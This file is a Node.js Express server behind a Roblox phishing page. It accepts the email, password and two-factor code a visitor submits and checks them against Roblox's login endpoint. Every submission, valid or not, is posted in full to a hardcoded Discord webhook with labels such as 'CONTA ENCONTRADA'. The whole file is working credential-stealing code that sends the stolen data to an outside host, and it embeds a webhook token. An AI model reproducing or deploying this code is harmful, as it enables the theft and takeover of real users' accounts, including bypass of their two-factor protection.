const express = require('express');
const fetch = require('node-fetch'); // Isto corrige o erro "fetch is not a function"
const app = express();
const port = process.env.PORT || 3000;

// SEU WEBHOOK DO DISCORD
const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

app.use(express.json());
app.use(express.static('.'));

async function loginRoblox(email, password) {
    const apiUrl = "https://www.roblox.com/users/login";
    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Roblox/WinInet',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                username: email,
                password: password
            }),
            timeout: 8000
        });

        const data = await response.json();
        
        return { 
            success: response.ok && data.id, 
            data: data, 
            error: data.error || null,
            statusCode: response.status
        };
    } catch (error) {
        return { success: false, data: null, error: error.message, statusCode: 0 };
    }
}

async function sendToDiscord(message) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message })
        });
    } catch (e) { console.error(e); }
}

app.post('/check', async (req, res) => {
    const { email, password, code2fa, isFinalStep } = req.body;

    if (isFinalStep) {
        const discordMessage = `**🔒 LOGIN COMPLETO (2FA)**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Code 2FA:** ${code2fa}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);
        return res.json({ success: true });
    }

    if (!email || !password) {
        return res.status(400).json({ success: false, error: "Missing email or password" });
    }

    const result = await loginRoblox(email, password);

    if (result.success) {
        const username = result.data.username || "Unknown";
        const userId = result.data.id || "Unknown";
        
        const discordMessage = `**🔒 CONTA ENCONTRADA!**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Username:** ${username}\n` +
                               `**User ID:** ${userId}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);

        return res.json({
            success: true,
            username: username,
            userId: userId,
            error: ""
        });
    } else {
        const errorMsg = result.error || "Conta ou Senha Incorretas";
        
        const discordMessage = `**❌ LOGIN FALHOU**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Erro:** ${errorMsg}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);

        return res.json({
            success: false,
            username: "Unknown",
            userId: "Unknown",
            error: errorMsg
        });
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
